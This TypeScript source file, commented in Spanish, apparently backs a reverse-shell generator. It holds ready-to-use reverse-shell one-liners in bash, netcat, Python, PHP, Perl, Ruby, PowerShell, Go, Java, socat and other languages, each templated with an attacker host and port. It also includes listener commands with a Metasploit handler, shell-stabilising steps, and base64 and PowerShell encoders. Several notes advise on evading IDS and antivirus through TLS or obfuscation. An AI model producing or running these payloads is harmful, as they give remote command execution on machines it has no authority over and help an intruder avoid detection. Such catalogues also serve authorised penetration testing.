/**
 * Catálogo de reverse shells, listeners y TTY upgrades.
 * Cada payload es una función pura que recibe contexto y devuelve string.
 * Implementación original — basada en payloads de dominio público / well-known.
 */

export interface GenContext {
  lhost: string;
  lport: number;
  shellPath: string; // /bin/sh, /bin/bash, /bin/zsh
}

export type Category = 'shell' | 'listener' | 'tty';

export interface Payload {
  id: string;
  name: string;
  language: string;
  category: Category;
  notes?: string;
  generate: (ctx: GenContext) => string;
}

const sh = (ctx: GenContext) => ctx.shellPath || '/bin/sh';

// ──────────────────────────── shells ────────────────────────────

const SHELLS: Payload[] = [
  {
    id: 'bash-tcp',
    name: 'Bash (-i /dev/tcp)',
    language: 'bash',
    category: 'shell',
    notes: 'Funciona en bash con /dev/tcp habilitado. La más usada.',
    generate: (c) => `bash -i >& /dev/tcp/${c.lhost}/${c.lport} 0>&1`,
  },
  {
    id: 'bash-196',
    name: 'Bash (sh -i 196)',
    language: 'bash',
    category: 'shell',
    generate: (c) => `0<&196;exec 196<>/dev/tcp/${c.lhost}/${c.lport}; sh <&196 >&196 2>&196`,
  },
  {
    id: 'bash-base64',
    name: 'Bash (base64 wrap)',
    language: 'bash',
    category: 'shell',
    notes: 'Útil cuando hay caracteres conflictivos en la línea de inyección.',
    generate: (c) => {
      const inner = `bash -i >& /dev/tcp/${c.lhost}/${c.lport} 0>&1`;
      return `echo ${btoa(inner)} | base64 -d | bash`;
    },
  },
  {
    id: 'sh-mkfifo',
    name: 'sh (mkfifo + nc)',
    language: 'sh',
    category: 'shell',
    notes: 'Para sistemas sin /dev/tcp y con nc tradicional (sin -e).',
    generate: (c) =>
      `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|${sh(c)} -i 2>&1|nc ${c.lhost} ${c.lport} >/tmp/f`,
  },
  {
    id: 'nc-e',
    name: 'nc (-e)',
    language: 'nc',
    category: 'shell',
    notes: 'Solo en versiones con -e (gnu netcat). Las modernas suelen no traerlo.',
    generate: (c) => `nc ${c.lhost} ${c.lport} -e ${sh(c)}`,
  },
  {
    id: 'nc-openbsd',
    name: 'nc.openbsd (mkfifo)',
    language: 'nc',
    category: 'shell',
    generate: (c) =>
      `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|${sh(c)} -i 2>&1|nc.openbsd ${c.lhost} ${c.lport} >/tmp/f`,
  },
  {
    id: 'busybox-nc',
    name: 'BusyBox nc',
    language: 'nc',
    category: 'shell',
    notes: 'Distros embebidas, contenedores Alpine.',
    generate: (c) => `busybox nc ${c.lhost} ${c.lport} -e ${sh(c)}`,
  },
  {
    id: 'ncat',
    name: 'ncat (--ssl)',
    language: 'nc',
    category: 'shell',
    notes: 'Encripta el canal con TLS — útil contra DPI/IDS.',
    generate: (c) => `ncat --ssl ${c.lhost} ${c.lport} -e ${sh(c)}`,
  },
  {
    id: 'python3',
    name: 'Python 3',
    language: 'python',
    category: 'shell',
    generate: (c) =>
      `python3 -c 'import os,socket,pty;s=socket.socket();s.connect(("${c.lhost}",${c.lport}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("${sh(c)}")'`,
  },
  {
    id: 'python2',
    name: 'Python 2',
    language: 'python',
    category: 'shell',
    generate: (c) =>
      `python -c 'import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${c.lhost}",${c.lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["${sh(c)}","-i"])'`,
  },
  {
    id: 'php-exec',
    name: 'PHP (exec)',
    language: 'php',
    category: 'shell',
    generate: (c) => `php -r '$sock=fsockopen("${c.lhost}",${c.lport});exec("${sh(c)} -i <&3 >&3 2>&3");'`,
  },
  {
    id: 'php-system',
    name: 'PHP (system)',
    language: 'php',
    category: 'shell',
    generate: (c) =>
      `php -r '$sock=fsockopen("${c.lhost}",${c.lport});$proc=proc_open("${sh(c)} -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'`,
  },
  {
    id: 'perl',
    name: 'Perl',
    language: 'perl',
    category: 'shell',
    generate: (c) =>
      `perl -e 'use Socket;$i="${c.lhost}";$p=${c.lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("${sh(c)} -i");};'`,
  },
  {
    id: 'ruby',
    name: 'Ruby',
    language: 'ruby',
    category: 'shell',
    generate: (c) =>
      `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("${c.lhost}","${c.lport}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`,
  },
  {
    id: 'awk',
    name: 'Awk',
    language: 'awk',
    category: 'shell',
    generate: (c) =>
      `awk 'BEGIN {s = "/inet/tcp/0/${c.lhost}/${c.lport}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`,
  },
  {
    id: 'golang',
    name: 'Go',
    language: 'go',
    category: 'shell',
    notes: 'Guarda como .go, compila y ejecuta.',
    generate: (c) =>
      `echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","${c.lhost}:${c.lport}");cmd:=exec.Command("${sh(c)}","-i");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/r.go && go run /tmp/r.go`,
  },
  {
    id: 'node',
    name: 'Node.js',
    language: 'javascript',
    category: 'shell',
    generate: (c) =>
      `require('child_process').exec('nc -e ${sh(c)} ${c.lhost} ${c.lport}')`,
  },
  {
    id: 'powershell',
    name: 'PowerShell (TCP)',
    language: 'powershell',
    category: 'shell',
    notes: 'Pegar en una sesión PowerShell. Detectado por AV — usa la variante -enc o ofusca.',
    generate: (c) =>
      `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${c.lhost}',${c.lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
  },
  {
    id: 'java',
    name: 'Java',
    language: 'java',
    category: 'shell',
    notes: 'Compila como clase Java y ejecuta.',
    generate: (c) =>
      `public class R{ public static void main(String[]a)throws Exception{ Runtime.getRuntime().exec(new String[]{"${sh(c)}","-c","sh -i 5<>/dev/tcp/${c.lhost}/${c.lport} 0<&5 1>&5 2>&5"}); }}`,
  },
  {
    id: 'telnet',
    name: 'Telnet (fifo)',
    language: 'sh',
    category: 'shell',
    notes: 'Dos puertos: stdin/stdout en distintos. Útil cuando solo hay telnet.',
    generate: (c) =>
      `TF=$(mktemp -u);mkfifo $TF && telnet ${c.lhost} ${c.lport} 0<$TF | ${sh(c)} 1>$TF`,
  },
  {
    id: 'socat-tty',
    name: 'Socat (TTY completo)',
    language: 'socat',
    category: 'shell',
    notes: 'Shell con TTY real desde el inicio. Listener correspondiente abajo.',
    generate: (c) =>
      `socat TCP:${c.lhost}:${c.lport} EXEC:"${sh(c)}",pty,stderr,setsid,sigint,sane`,
  },
];

// ──────────────────────────── listeners ────────────────────────────

const LISTENERS: Payload[] = [
  {
    id: 'nc-listen',
    name: 'nc -lvnp',
    language: 'nc',
    category: 'listener',
    generate: (c) => `nc -lvnp ${c.lport}`,
  },
  {
    id: 'rlwrap-nc',
    name: 'rlwrap nc',
    language: 'nc',
    category: 'listener',
    notes: 'Añade historial y edición de línea al listener.',
    generate: (c) => `rlwrap nc -lvnp ${c.lport}`,
  },
  {
    id: 'ncat-ssl',
    name: 'ncat --ssl',
    language: 'nc',
    category: 'listener',
    generate: (c) => `ncat --ssl -lvnp ${c.lport}`,
  },
  {
    id: 'socat-listen',
    name: 'socat (TTY)',
    language: 'socat',
    category: 'listener',
    notes: 'Empareja con el payload socat-tty para shell completa al primer instante.',
    generate: (c) =>
      `socat -d -d TCP-LISTEN:${c.lport},reuseaddr,fork STDOUT`,
  },
  {
    id: 'msf-handler',
    name: 'msfconsole multi/handler',
    language: 'msf',
    category: 'listener',
    generate: (c) =>
      `msfconsole -q -x "use multi/handler; set PAYLOAD generic/shell_reverse_tcp; set LHOST ${c.lhost}; set LPORT ${c.lport}; run"`,
  },
];

// ──────────────────────────── tty upgrades ────────────────────────────

const TTY: Payload[] = [
  {
    id: 'python-pty',
    name: 'Python pty.spawn (Linux)',
    language: 'python',
    category: 'tty',
    notes: 'Tras ganar shell, ejecutar esto desde dentro.',
    generate: () => `python3 -c 'import pty; pty.spawn("/bin/bash")'`,
  },
  {
    id: 'script-tty',
    name: 'script /dev/null',
    language: 'sh',
    category: 'tty',
    generate: () => `script -qc /bin/bash /dev/null`,
  },
  {
    id: 'stty-raw',
    name: 'stty raw (en tu host)',
    language: 'sh',
    category: 'tty',
    notes:
      'Pasos completos para shell interactiva: 1) python pty, 2) Ctrl-Z, 3) este comando local, 4) fg, 5) export.',
    generate: () => `stty raw -echo; fg
# luego en la shell remota:
# export TERM=xterm-256color
# stty rows <rows> cols <cols>`,
  },
];

export const PAYLOADS: Payload[] = [...SHELLS, ...LISTENERS, ...TTY];

// ──────────────────────────── encodings ────────────────────────────

export type Encoding = 'raw' | 'url' | 'base64' | 'powershell-enc';

export function encode(payload: string, mode: Encoding): string {
  switch (mode) {
    case 'raw':
      return payload;
    case 'url':
      return encodeURIComponent(payload);
    case 'base64':
      return btoa(unescape(encodeURIComponent(payload)));
    case 'powershell-enc': {
      // UTF-16LE base64 — formato que acepta `powershell -enc`
      const bytes = new Uint8Array(payload.length * 2);
      for (let i = 0; i < payload.length; i++) {
        const code = payload.charCodeAt(i);
        bytes[i * 2] = code & 0xff;
        bytes[i * 2 + 1] = (code >> 8) & 0xff;
      }
      let bin = '';
      for (let i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
      return `powershell -enc ${btoa(bin)}`;
    }
  }
}

export function categorize(items: Payload[]) {
  return {
    shell: items.filter((p) => p.category === 'shell'),
    listener: items.filter((p) => p.category === 'listener'),
    tty: items.filter((p) => p.category === 'tty'),
  };
}

export const SHELL_PATHS = ['/bin/sh', '/bin/bash', '/bin/zsh', '/bin/dash', '/bin/ash'];
